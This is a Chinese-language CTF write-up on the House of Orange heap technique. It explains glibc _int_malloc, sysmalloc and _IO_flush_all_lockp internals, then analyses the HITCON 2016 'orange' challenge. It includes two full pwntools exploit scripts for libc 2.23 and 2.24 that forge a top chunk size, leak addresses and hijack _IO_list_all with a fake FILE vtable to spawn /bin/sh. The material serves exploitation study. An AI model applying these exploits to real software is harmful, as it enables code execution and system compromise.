---
layout:     post
title:      "House of orange🍊"
subtitle:   "无free的堆利用"
date:       2018-11-06 12:00:00
author:     "Chris"
catalog: true
tags:
    - Pwn
    - 笔记
 
---

>为了学习"传说中"的House of orange🍊，我去把glibc源码的`malloc.c` `genops.c`关于内存分配和`I/O Operations`的源码研究了一下，梳理了整个流程，我把研究的一些细节的东西写下来，供分享。

# House of orange 概述

House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。

<span id="House_of_orange"></span>
# House of orange 原理 

如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。

我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的malloc调用会执行到 libc.so 的`_int_malloc`函数中，在`int_malloc`函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来`_int_malloc`函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。

```c
/*
Otherwise, relay to handle system-dependent cases
*/
else {
      void *p = sysmalloc(nb, av);
      if (p != NULL && __builtin_expect (perturb_byte, 0))
    alloc_perturb (p, bytes);
      return p;
}
```
此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。

```c
if (av == NULL
      || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
          && (mp_.n_mmaps < mp_.n_mmaps_max)))
/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/
    {
    char *mm;           /* return value from mmap call*/
    try_mmap:
    .......

    }

.......
brk = snd_brk = (char *) (MORECORE_FAILURE);
assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));

/* Precondition: not enough current space to satisfy nb request */
assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```
综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于`mmp_.mmap_threshold`,使得top chunk以brk形式扩展。

后续检查`old_top_size`要求.

总结一下伪造的 top chunk size 的要求

* 伪造的 size 必须要对齐到内存页
* size 要大于 MINSIZE(0x10)
* size 要小于之后申请的 chunk size + MINSIZE(0x10)
* size 的 prev inuse 位必须为 1

之后原有的 top chunk 就会执行_int_free从而顺利进入 unsorted bin 中。

关于size对齐到页，可以这样理解，`top_chunk_addr` + `top_chunk_size` =Align [ 0x1000 (4kb) ]

比如，在覆盖之前 top chunk 的 size 大小是 20fe1，top chunk地址为0x602020，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。

在top chunk进入unsorted bin之后，我们就可以利用`unsorted bin attack`来修改`_IO_list_all`指向我们伪造的`_IO_FILE`，进入下一步攻击。关于`unsorted bin attack `的知识点,详见我的另一篇博文[https://sirhc.xyz/2018/09/06/Unsorted-Bin-Attack-%E7%AC%94%E8%AE%B0/](https://sirhc.xyz/2018/09/06/Unsorted-Bin-Attack-%E7%AC%94%E8%AE%B0/)

<span id="FSOP"></span>
# FSOP原理

这里简单介绍一下FSOP

FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 [_IO_FILE利用思路总结](https://sirhc.xyz/2018/12/07/_IO_FILE%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/) 得知进程内所有的`_IO_FILE` 结构会使用`_chain` 域相互连接形成一个链表，这个链表的头部由`_IO_list_all` 维护。

FSOP 的核心思想就是劫持`_IO_list_all` 的值来伪造链表和其中的`_IO_FILE` 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用`_IO_flush_all_lockp`，这个函数会刷新`_IO_list_all` 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用`_IO_FILE_plus.vtable` 中的`_IO_overflow`。

这里随便贴一张`_IO_FILE`的结构，便于查看

![](/img/pic/house_of_orange/3.jpg)

我们的目标是触发`_IO_OVERFLOW`，下面是`_IO_flush_all_lockp`的源代码：

```c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
	{
	  /* Something was added to the list.  Start all over again.  */
	  fp = (_IO_FILE *) _IO_list_all;
	  last_stamp = _IO_list_all_stamp;
	}
      else
	fp = fp->_chain;
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
```
可以看出当`_IO_FILE`结构满足下面的条件：最外层（）里面的判断结果为ture时`（）&&_IO_OVERFLOW (fp, EOF)`才会被调用（&&有短路功能），转而通过`fp = fp->_chain`寻找新的`_IO_file`结构来使用。

```c
（
	(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)

       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base)
                     
                    ）
```	       
所以伪造的file结构体要通过的条件

```c
1.((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
```
	   
或者是
	
```c
2._IO_vtable_offset (fp) == 0 
&& fp->_mode > 0 
&& (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
```
一般来说第一种比较好伪造,我的exp也是基于第一种构造的。



`_IO_flush_all_lockp `不需要攻击者手动调用，在一些情况下这个函数会被系统调用：

* 当 libc 执行 abort 流程时
* 当执行 exit 函数时
* 当执行流从 main 函数返回时

![](/img/pic/house_of_orange/2.jpg)

<span id="_int_malloc"></span>
# _ int_malloc()函数解析

nb为传入的分配size大小参数。

```c
if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
{
  idx = fastbin_index (nb);
  mfastbinptr *fb = &fastbin (av, idx);
  mchunkptr pp = *fb;
  do
    {
      victim = pp;
      if (victim == NULL)
        break;
    }
  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
         != victim);
  if (victim != 0)
    {
      if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
        {
          errstr = "malloc(): memory corruption (fast)";
        errout:
          malloc_printerr (check_action, errstr, chunk2mem (victim), av);
          return NULL;
        }
      check_remalloced_chunk (av, victim, nb);
      void *p = chunk2mem (victim);
      alloc_perturb (p, bytes);
      return p;
    }
}
```

如果所需的 chunk 大小小于等于 fast bins 中的最大 chunk 大小，首先尝试从 fast bins 中
分配 chunk

```c
if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          if (victim == 0) /* initialization check */
            malloc_consolidate (av);
          else
            {
              bck = victim->bk;
	if (__glibc_unlikely (bck->fd != victim))
                {
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
              set_inuse_bit_at_offset (victim, nb);
              bin->bk = bck;
              bck->fd = bin;

              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
    }
```

如果分配的 chunk 属于 small bin，首先查找 chunk 所对应 small bins 数组的 index，然后
根据 index 获得某个 small bin 的空闲 chunk 双向循环链表表头，然后将最后一个 chunk 赋值
给 victim，如果 victim 与表头相同，表示该链表为空，不能从 small bin 的空闲 chunk 链表中
分配，这里不处理，等后面的步骤来处理。

```c
else
{
  idx = largebin_index (nb);
  if (have_fastchunks (av))
    malloc_consolidate (av);
}
```

所需 chunk 不属于 small bins，那么就一定属于 large bins，首先根据 chunk 的大小获得
对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果存在，调用 malloc_consolidate()函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin
中。

```c
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
{
  bck = victim->bk;
  if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
      || __builtin_expect (victim->size > av->system_mem, 0))
    malloc_printerr (check_action, "malloc(): memory corruption",
                     chunk2mem (victim), av);
  size = chunksize (victim);

  /*
     If a small request, try to use last remainder if it is the
     only chunk in unsorted bin.  This helps promote locality for
     runs of consecutive small requests. This is the only
     exception to best-fit, and applies only when there is
     no exact fit for a small chunk.
   */

  if (in_smallbin_range (nb) &&
      bck == unsorted_chunks (av) &&
      victim == av->last_remainder &&
      (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
    {
      /* split and reattach remainder */
      remainder_size = size - nb;
      remainder = chunk_at_offset (victim, nb);
      unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
      av->last_remainder = remainder;
      remainder->bk = remainder->fd = unsorted_chunks (av);
      if (!in_smallbin_range (remainder_size))
        {
          remainder->fd_nextsize = NULL;
          remainder->bk_nextsize = NULL;
        }

      set_head (victim, nb | PREV_INUSE |
                (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);
      set_foot (remainder, remainder_size);

      check_malloced_chunk (av, victim, nb);
      void *p = chunk2mem (victim);
      alloc_perturb (p, bytes);
      return p;
    }

  /* remove from unsorted list */
  unsorted_chunks (av)->bk = bck;
  bck->fd = unsorted_chunks (av);

  /* Take now instead of binning if exact fit */

  if (size == nb)
    {
      set_inuse_bit_at_offset (victim, size);
      if (av != &main_arena)
        victim->size |= NON_MAIN_ARENA;
      check_malloced_chunk (av, victim, nb);
      void *p = chunk2mem (victim);
      alloc_perturb (p, bytes);
      return p;
    }

  /* place chunk in bin */

  if (in_smallbin_range (size))
    {
      victim_index = smallbin_index (size);
      bck = bin_at (av, victim_index);
      fwd = bck->fd;
    }
  else
    {
      victim_index = largebin_index (size);
      bck = bin_at (av, victim_index);
      fwd = bck->fd;

      /* maintain large bins in sorted order */
      if (fwd != bck)
        {
          /* Or with inuse bit to speed comparisons */
          size |= PREV_INUSE;
          /* if smaller than smallest, bypass loop below */
          assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
          if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
            {
              fwd = bck;
              bck = bck->bk;

              victim->fd_nextsize = fwd->fd;
              victim->bk_nextsize = fwd->fd->bk_nextsize;
              fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
            }
          else
            {
              assert ((fwd->size & NON_MAIN_ARENA) == 0);
              while ((unsigned long) size < fwd->size)
                {
                  fwd = fwd->fd_nextsize;
                  assert ((fwd->size & NON_MAIN_ARENA) == 0);
                }

              if ((unsigned long) size == (unsigned long) fwd->size)
                /* Always insert in the second position.  */
                fwd = fwd->fd;
              else
                {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
                }
              bck = fwd->bk;
            }
        }
      else
        victim->fd_nextsize = victim->bk_nextsize = victim;
    }

  mark_bin (av, victim_index);
  victim->bk = bck;
  victim->fd = fwd;
  fwd->bk = victim;
  bck->fd = victim;

#define MAX_ITERS       10000
  if (++iters >= MAX_ITERS)
    break;
}
```

* 走到了这一步，也就是从 `fast bins` , `small bins` , `large bins`的链表中均没有找到合适的chunk，反向遍历 `unsorted bin` 的双向循环链表中的`unsorted bin chunk`,并检查当前遍历的 chunk 是否合法，不合法则抛出`malloc_printerr` 
*  如果需要分配一个 `small bin chunk`，在上面的 `small bins` 中没有匹配到合适的chunk，并且 `unsorted bin` 中只有一个 chunk，并且这个 chunk 为 `last remainder chunk`，并且这个 chunk 的大小大于所需 chunk 的大小加上 `MINSIZE`，在满足这些条件的情况下，用这个chunk切分出需要的`small bin chunk`,将内存指针返回给应用层，退出`_int_malloc()`。这是唯一的从`unsorted bin`中分配`small bin chunk`的情况
*  如果没有上面直接从`unsorted bin`中切割分配`small bin chunk`这一步，就将双向循环链表中的最后一个 chunk 移除，如果当前遍历的 `unsorted bin chunk` 与所需的 chunk 大小一致，就将当前 chunk 返回。
*  到这一步，说明已经把`unsorted bin`中最后一个chunk移除了，接下来就是 如果该chunk大小属于`small bins`那就将其链入合适的`small bins`；如果该chunk大小属于`large bins`那就将其链入合适的`large bins`。`large bin`和`small bin`不一样，将其链入`large bins`时会被填入`fd_nextsize`,`bk_nextsize`项，指向下一个堆地址。
* 循环上面步骤，如果 unsorted bin 中的 chunk 超过了 10000 个，最多遍历 10000 个就退出，避免长时间
处理 unsorted bin 影响内存分配的效率。


接下来的源码我就不贴出来了，这里简单说一下接下来的步骤：当将 unsorted bin 中的空闲 chunk 加入到相应的 small bins 和 large bins 后，将使用最佳匹配法分配chunk,找到合适的`small bin chunk` 或者 `large bin chunk`,然后切割该chunk，返回给用户，切割的剩余部作为一个新的 chunk 加入到 unsorted bin 中（如果切割剩余部分的大小小于 MINSIZE(32B)，将整个 chunk 分配给应用层）.......

当然如果从所有的 bins 中都没有获得所需的 chunk，可能的情况为 bins 中没有空闲 chunk，
或者所需的 chunk 大小很大，下一步将尝试从 top chunk 中分配所需 chunk.......



# hitcon-2016 相关PWN题

### 代码分析

![](/img/pic/house_of_orange/4.jpg)

堆利用的题保护全开也不是什么见怪的....

程序有3个功能:

![](/img/pic/house_of_orange/5.jpg)

###### 1.build功能代码如下：

![](/img/pic/house_of_orange/6.jpg)
![](/img/pic/house_of_orange/7.jpg)

###### 2.see功能代码如下：

![](/img/pic/house_of_orange/8.jpg)

###### 3.upgrade功能代码如下：

![](/img/pic/house_of_orange/9.jpg)

经分析，题目中创建了两种数据结构orange与house

```c
struct orange{
  int price ;
  int color ;
};
 
struct house {
  struct orange *org;
  char *name ;
};
```
题目中共分为4种操作

* build house  :
创建一个包含orange和name的house，其中orange 结构中包含其price与color
* see house  :
打印house的name与orange
* upgrade house  ：
更新house的信息，包括name与orange
* exit  ：
退出程序

其中build的操作限制次数为4次，upagrade的次数为3次。

漏洞：

在Upgrade中，重新输入house的name时没有判断大小，可能导致HeapOverflow

在输入name函数中,read在输入的字符串后没有加入’\0’可能导致信息泄露


![](/img/pic/house_of_orange/10.jpg)

### 漏洞利用

我们在进行漏洞利用的时候会遇到以下困难：

* 使用House-Of-Force尝试去修改name指针，但是题目中限制了name的最大大小为0x1000，方案不可行。
* 题目中并没有进行free，所以尝试使用HeapOverflow溢出到name pointer必然会用到free后再malloc，方案不可行


官方的解决思路是利用House-Of-Orange

###### 1.OverWrite TopChunk

首先要使 Unsort bin 中在没有free函数的情况下，出现被释放的chunk，我们利用Overwrite TopChunk，修改topchunk的size，要绕过的check见 - [House of orange 原理](#House_of_orange)。

创建一个house，upgrade它覆盖topchunk，覆盖`top chunk`的 size为`0xf31`,为什么是`0xf31` ? 
我们可以计算，build一个house，我们先分配了 `0x20` 的chunk，然后接着为name分配了 `0x90` 大小的chunk，最后为price，colour又分配了 `0x20` 的chunk，我们一共占用的heap空间为 `0x20+0x90+0x20=0xd0`,再加上top chunk的大小也就是整个main_arena分配的heap大小 必须要页对齐（4kb=0x1000），用`0x1000-0xd0=0xf30` size 的 prev inuse 位必须为 1,所以最终确定构造的size为`0xf31`

```python
build(0x80,'AAAA',1,1)
upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)
```
upgrade后的heap chunks如下图：

![](/img/pic/house_of_orange/11.jpg)

然后如果我们再分配一个不大于mmap分配阈值(默认为 128K)的chunk，让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 `unsorted bin` 中。

```python
build(0x1000,'CCCC',3,3)
```

执行完后，bins 如图所示：

![](/img/pic/house_of_orange/12.jpg)

原有的 `top chunk` 会被置于 `unsorted bin` 中 ，且大小被切割。

###### 2.Leak address

接下来要做的是泄露libc地址和heap地址

此时的`unsorted bin`当中存在着一个大小为`large bin`的chunk，且`last_remainder`指向该chunk

![](/img/pic/house_of_orange/13.jpg)

当我们再次build一个house，且该house的name大小为`large bin`时，我们就能分配到一个可同时泄露`main_arena`地址和`heap`地址的chunk.

```python
build(0x400,'D'*8,4,4)
```

下面是分配的name的chunk图：

![](/img/pic/house_of_orange/14.jpg)

下面我就来详细分析一下为什么，这涉及到glibc源码`malloc.c`的`_int_malloc()`函数，详细说明见上面的[_ int_malloc()函数解析](#_int_malloc)

如果我们build的name大小为`small bin`会发生什么呢 ？因为这时的 `unsorted bin` 中只有一个 chunk，并且这个 chunk 为 `last remainder chunk`，并且这个 chunk 的大小大于所需 chunk 的大小加上 `MINSIZE` ,所以就直接使用这个`unsorted bin chunk`切分出需要的`small bin chunk`.这样的话，`unsorted bin`中的chunk并没有被链入`large bin`,所以我们分配到的mem空间中就不会有`fd_nextsize`,`bk_nextsize`字段,就不会泄露堆地址。

![](/img/pic/house_of_orange/19.jpg)

泄露地址很简单，用see功能就行，因为printf是遇到'\x00'结束，所以我们需要upgrade名字内容为可见ascii码,这里填充为D和E，便于接收，再see

泄露libc地址，进而得到`system`，`_IO_list_all`地址

```python
see()
io.recvuntil('Name of house : DDDDDDDD')
libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c2760-0x668
system_addr = libc_base+libc.symbols['system']
log.info('system_addr:'+hex(system_addr))
IO_list_all = libc_base+libc.symbols['_IO_list_all']
log.info('_IO_list_all:'+hex(IO_list_all))
```

泄露heap地址

```python
upgrade(0x400,'E'*0x10,5,5)
see()
io.recvuntil('Name of house : ')
io.recvuntil('E'*0x10)
heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
log.info('heap_base:'+hex(heap_base))
```
###### 3.UnsortedBin attack 与 FSOP

UnsortedBin Attack的原理见我的[Unsorted Bin Attack 笔记](https://sirhc.xyz/2018/09/06/Unsorted-Bin-Attack-%E7%AC%94%E8%AE%B0/)

`_IO_FILE`相关的`FSOP`的原理见[FSOP原理](#FSOP)

首先利用UnsortedBin Attack去劫持`_IO_list_all`全局变量，可将`_IO_list_all`更改为`unsorted_bin(av)`，即`main_arena+0x58`。这样当触发`_IO_flush_all_lockp`时，我们可在`main_arena`寻求构造`fake IO_file`结构的机会。

由于无法控制`main_arena`中的内容，所以我们决定使用指向`next IOFILE`对象的链指针,上面提到了`_IO_flush_all_lockp` 将会利用`_chain`选择下一个`_IO_file`，`_chain`的地址恰好是smallbin[4]的地址，所以我们通过upgrade修改Unsorted Bin的大小为0x61，再次malloc时，UnsortedBin中的chunk从链表中卸下来。smallbin[4]即`_chain`中就填入了heap内容,代码如下：

```python
vtable_addr = heap_base +0x140

pad =p64(0)*3+p64(system_addr)  # vtable
pad = pad.ljust(0x410,"\x00")
pad += p32(6)+p32(6)+p64(0)

stream = "/bin/sh\x00"+p64(0x61)
stream += p64(0xddaa)+p64(IO_list_all-0x10)
stream +=p64(1)+p64(2)     # fp->_IO_write_ptr > fp->_IO_write_base
stream = stream.ljust(0xc0,"\x00")
stream += p64(0)    # mode<=0
stream += p64(0)
stream += p64(0)
stream += p64(vtable_addr)

payload = pad + stream

upgrade(0x800,payload,6,3)

io.recvuntil('Your choice : ')
io.sendline(str(1))
```
构造完payload -> bulid ->  `UnsortedBin attack`成功执行后，我们看看`_IO_list_all`指向的`main arena+0x58`下的`_chain`:

![](/img/pic/house_of_orange/20.jpg)

我们在smallbin[4]中构造一个`fake IOfile`，flags中填入”/bin/sh\x00″,构造出`_IO_write_ptr` > `_IO_write_base`,`_mode` <= 0,然后vtable填入一个之前构造`fake IO_jump_t`的heap地址，如下图：

![](/img/pic/house_of_orange/21.jpg)

我们之前已经在heap中布置好了`fake IO_jump_t`，Vtable中我们的payload中修改`__overflow`的地址为system地址，并且第一个参数fp="/bin/sj\x00"，如果`_IO_flush_lockp`中验证通过，将会调用`_IO_OVERFLOW (fp, EOF) == EOF)`，则可顺利执行system(“/bin/sh\x00”)，Getshell.

![](/img/pic/house_of_orange/22.jpg)

###### 4.libc_2.24下的利用

参考资料见我的[_IO_FILE利用思路总结](https://sirhc.xyz/2018/12/07/_IO_FILE%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/)

与libc2.23及以下的利用方式有点差距，主要是我们这里利用`__IO_str_jumps`中的`_IO_str_overflow`函数，我们不仅要绕过之前的`_IO_flush_all_lockp`检查，也要绕过`__IO_str_overflow`函数对`_IO_FILE`结构的检查，详细见exp


###### 5.Unexpected

该攻击有一定概率失败，主要原因是因为第一次将`_IO_list_all`劫持到`main_arena`时，由于`main_arena`不可控，该内存随机

```c
     if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)   
   || (_IO_vtable_offset (fp) == 0                                    
       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr             
			    > fp->_wide_data->_IO_write_base))                          
   )                                                                  
  && _IO_OVERFLOW (fp, EOF) == EOF)                                   
result = EOF;                                                         
```

  `&& _IO_OVERFLOW (fp, EOF) == EOF`的符号`&&`为**短路与**，所以有时该check流程，假如`((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)`判断为真，或者是
`_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)`判断为真,那他们相或结果为真，就会造成执行
`_IO_OVERFLOW (fp, EOF) == EOF)`调用未知Vtable错误地址，程序Abort，所以程序有一定概率失败。

如果那两个判断都为假，那他们相或结果为假，根据&&的短路与，就不会执行右边的`_IO_OVERFLOW (fp, EOF) == EOF)`，直接通过`fp = fp->_chain`寻找新的`_IO_file`结构来执行`_IO_OVERFLOW`

### EXP-libc2.23

```python
from pwn import *
#context(os='linux', arch='amd64', log_level='debug')

env = {}
env = {'LD_PRELOAD' : './libc-2.23.so'}
io = process('./orange', env=env)


elf = ELF('./orange')
libc = ELF('libc-2.23.so')

def build(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(1))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name :')
    io.send(Name)
    io.recvuntil('Orange:')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange:')
    io.sendline(str(Choice))

def see():
    io.recvuntil('Your choice : ')
    io.sendline(str(2))

def upgrade(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(3))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name:')
    io.send(Name)
    io.recvuntil('Orange: ')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange: ')
    io.sendline(str(Choice))

#OverWrite TopChunk
build(0x80,'AAAA',1,1)
upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)

#TopChunk->unsorted bin
build(0x1000,'CCCC',3,3)

#leak libc_base 
build(0x400,'D'*8,4,4)
see()
io.recvuntil('Name of house : DDDDDDDD')
libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x3c4b20-0x668
system_addr = libc_base+libc.symbols['system']
log.info('system_addr:'+hex(system_addr))
IO_list_all = libc_base+libc.symbols['_IO_list_all']
log.info('_IO_list_all:'+hex(IO_list_all))

#leak heap_base
upgrade(0x400,'E'*0x10,5,5)
see()
io.recvuntil('Name of house : ')
io.recvuntil('E'*0x10)
heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
log.info('heap_base:'+hex(heap_base))


# unsortedbin attack ,Fsop

vtable_addr = heap_base +0x140

pad =p64(0)*3+p64(system_addr) # vtable
pad = pad.ljust(0x410,"\x00")
pad += p32(6)+p32(6)+p64(0)

stream = "/bin/sh\x00"+p64(0x61)
stream += p64(0xddaa)+p64(IO_list_all-0x10)
stream +=p64(1)+p64(2) # fp->_IO_write_ptr > fp->_IO_write_base
stream = stream.ljust(0xc0,"\x00")
stream += p64(0) # mode<=0
stream += p64(0)
stream += p64(0)
stream += p64(vtable_addr)

payload = pad + stream

upgrade(0x800,payload,6,3)

io.recvuntil('Your choice : ')
io.sendline(str(1))

io.interactive()

```

### EXP-libc2.24

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
#context(os='linux', arch='amd64', log_level='debug')

env = {}
env = {'LD_PRELOAD' : './libc-2.24.so'}
io = process('./orange', env=env)

elf = ELF('./orange')
libc = ELF('libc-2.24.so')

IO_file_jumps_offset = libc.sym['_IO_file_jumps']
IO_str_underflow_offset = libc.sym['_IO_str_underflow']
for ref_offset in libc.search(p64(IO_str_underflow_offset)):
    possible_IO_str_jumps_offset = ref_offset - 0x20
    if possible_IO_str_jumps_offset > IO_file_jumps_offset:
        print possible_IO_str_jumps_offset
        break

def build(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(1))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name :')
    io.send(Name)
    io.recvuntil('Orange:')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange:')
    io.sendline(str(Choice))

def see():
    io.recvuntil('Your choice : ')
    io.sendline(str(2))

def upgrade(Length,Name,Price,Choice):
    io.recvuntil('Your choice : ')
    io.sendline(str(3))
    io.recvuntil('name :')
    io.sendline(str(Length))
    io.recvuntil('Name:')
    io.send(Name)
    io.recvuntil('Orange: ')
    io.sendline(str(Price))
    io.recvuntil('Color of Orange: ')
    io.sendline(str(Choice))



#OverWrite TopChunk
build(0x80,'AAAA',1,1)
upgrade(0x100,'B'*0x80+p64(0)+p64(0x21)+p32(0)+p32(0)+2*p64(0)+p64(0xf31),2,2)

#TopChunk->unsorted bin
build(0x1000,'CCCC',3,3)

#leak libc_base 
build(0x400,'D'*8,4,4)
see()
io.recvuntil('Name of house : DDDDDDDD')
libc_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x397b00-0x668
print "libc_base : " +hex(libc_base)
system_addr = libc_base+libc.symbols['system']
log.info('system_addr:'+hex(system_addr))
IO_list_all = libc_base+libc.symbols['_IO_list_all']
log.info('_IO_list_all:'+hex(IO_list_all))
_IO_str_jumps=libc_base+possible_IO_str_jumps_offset
print "possible_IO_str_jumps_offset : "+hex(_IO_str_jumps)




#leak heap_base
upgrade(0x400,'E'*0x10,5,5)
see()
io.recvuntil('Name of house : ')
io.recvuntil('E'*0x10)
heap_base = u64(io.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x130
log.info('heap_base:'+hex(heap_base))


# unsortedbin attack ,Fsop

binsh_addr = heap_base +0x140

pad ="/bin/sh\x00"   # binsh address
pad = pad.ljust(0x410,"\x00")
pad += p32(6)+p32(6)+p64(0)

stream = p64(0)+p64(0x61)  # fp->_flags = 0
stream += p64(0xddaa)+p64(IO_list_all-0x10)
stream +=p64(1)+p64(0x7ffffffffffd) # (fp->_IO_write_ptr - fp->_IO_write_base )  是一个很大的正值,远大于  (fp->_IO_buf_end - fp->_IO_buf_base)
stream +=p64(0)
stream +=p64(0)+p64((binsh_addr-100)/2)  # fp->_IO_buf_base=0 ,  fp->_IO_buf_end=(binsh_addr-100)/2
stream = stream.ljust(0xc0,"\x00")
stream += p64(0) # mode<=0
stream += p64(0)
stream += p64(0)
stream += p64(_IO_str_jumps)   # vtable
stream = stream.ljust(0xe0,"\x00")
stream +=p64(system_addr)   # call system

payload = pad + stream

upgrade(0x800,payload,6,3)
#raw_input()
#gdb.attach(io)
io.recvuntil('Your choice : ')
io.sendline(str(1))

io.interactive()


```

执行结果看下图：

![](/img/pic/house_of_orange/23.jpg)

[程序和脚本下载链接](https://github.com/yxshyj/project/tree/master/pwn/House%20of%20orange)